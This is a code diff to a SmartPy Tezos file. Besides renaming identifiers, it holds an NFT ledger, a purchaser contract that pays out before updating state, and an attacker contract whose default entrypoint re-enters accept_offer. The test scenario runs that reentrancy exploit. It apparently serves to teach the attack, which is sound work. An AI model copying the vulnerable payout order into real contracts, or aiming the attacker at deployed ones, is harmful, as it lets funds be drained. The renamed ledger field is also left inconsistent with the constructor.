@@ -2,7 +2,7 @@ import smartpy as sp
 @sp.module
 def main():
 
-    paramType:type = sp.record(token_id = sp.int, new_owner = sp.address)
+    param_type:type = sp.record(token_id = sp.int, new_owner = sp.address)
 
     class Ledger(sp.Contract):
         
@@ -13,6 +13,7 @@ def main():
 
         @sp.entrypoint
         def mint(self, metadata):
+            sp.cast(metadata, sp.string)
             self.data.tokens[self.data.next_token_id] = sp.record(owner = sp.sender, metadata = metadata)
             self.data.next_token_id += 1
 
@@ -27,7 +28,6 @@ def main():
             self.data.tokens[token_id].owner = new_owner
 
     class Purchaser(sp.Contract):
-
         def __init__(self, admin):
             self.data.admin = admin
             self.data.ledger_address = admin
@@ -36,13 +36,15 @@ def main():
             self.data.nb_offers = 1
 
         @sp.entrypoint
-        def setLedger(self, ledger_address):
+        def set_ledger(self, ledger):
             assert sp.sender == self.data.admin
-            self.data.ledger_address = ledger_address
+            self.data.ledger = ledger
 
         @sp.entrypoint
-        def addOffer(self, token_id):
-            self.data.offers[self.data.nb_offers] = sp.record(token_id = token_id, buyer = sp.sender, price = sp.amount)
+        def add_offer(self, token_id):
+            self.data.offers[self.data.nb_offers] = sp.record(token_id = token_id,
+                                                              buyer = sp.sender,
+                                                              price = sp.amount)
             self.data.nb_offers += 1
             if not self.data.escrow.contains(sp.sender):
                 self.data.escrow[sp.sender] = sp.tez(0)
@@ -52,17 +54,17 @@ def main():
         def accept_offer(self, offer_id):
             sp.cast(offer_id, sp.int)
             offer = self.data.offers[offer_id]
-            owner = sp.view("get_token_owner", self.data.ledger_address, offer.token_id, sp.address).unwrap_some()            
+            owner = sp.view("get_token_owner", self.data.ledger, offer.token_id, sp.address).unwrap_some()            
             assert sp.sender == owner
             sp.send(owner, offer.price)
             self.data.escrow[offer.buyer] -= offer.price
-            ledger_contract = sp.contract(paramType, self.data.ledger_address, entrypoint="change_owner").unwrap_some()
+            ledger_contract = sp.contract(param_type, self.data.ledger, entrypoint = "change_owner").unwrap_some()
             sp.transfer(sp.record(token_id = offer.token_id, new_owner = offer.buyer), sp.tez(0), ledger_contract)
 
     class Attacker(sp.Contract):
 
-        def __init__(self, purchaserAddress):
-            self.data.purchaserAddress = purchaserAddress
+        def __init__(self, purchaser):
+            self.data.purchaser = purchaser
             self.data.nbCalls = 0
             self.data.offer_id = 0
             self.data.price = sp.tez(0)
@@ -71,21 +73,21 @@ def main():
         def attack(self, offer_id):
             self.data.nbCalls = 2
             self.data.offer_id = offer_id
-            purchaser_contract = sp.contract(sp.int, self.data.purchaserAddress, entrypoint="accept_offer").unwrap_some()
+            purchaser_contract = sp.contract(sp.int, self.data.purchaser, entrypoint="accept_offer").unwrap_some()
             sp.transfer(offer_id, sp.tez(0) , purchaser_contract)
 
         @sp.entrypoint
         def default(self):
             self.data.nbCalls -= 1
             if self.data.nbCalls > 0:
-                purchaser_contract = sp.contract(sp.int, self.data.purchaserAddress, entrypoint="accept_offer").unwrap_some()
+                purchaser_contract = sp.contract(sp.int, self.data.purchaser, entrypoint="accept_offer").unwrap_some()
                 sp.transfer(self.data.offer_id, sp.tez(0), purchaser_contract)
                 
             
 # Tests
-@sp.add_test(name = "testing ledger")
+@sp.add_test()
 def test():
-    scenario = sp.test_scenario(main)
+    scenario = sp.test_scenario("Test", main)
     alice = sp.test_account("alice").address
     bob = sp.test_account("Bob").address
     purchaser = main.Purchaser(alice)
@@ -95,14 +97,14 @@ def test():
     attacker = main.Attacker(purchaser.address)
     scenario += attacker
 
-    purchaser.setLedger(ledger.address).run(sender = alice)
+    purchaser.set_ledger(ledger.address, _sender = alice)
 
-    ledger.mint("my NFT").run(sender = attacker.address)
+    ledger.mint("my NFT", _sender = attacker.address)
     a = ledger.get_token_owner(1)
     scenario.verify(a == attacker.address)
 
-    purchaser.addOffer(1).run(sender = alice, amount = sp.tez(100))
-    purchaser.addOffer(2).run(sender = alice, amount = sp.tez(100))
-    #purchaser.accept_offer(1).run(sender = attacker.address)
+    purchaser.add_offer(1, _sender = alice, _amount = sp.tez(100))
+    purchaser.add_offer(2, _sender = alice, _amount = sp.tez(100))
+    #purchaser.accept_offer(1, _sender = attacker.address)
  
     attacker.attack(1)
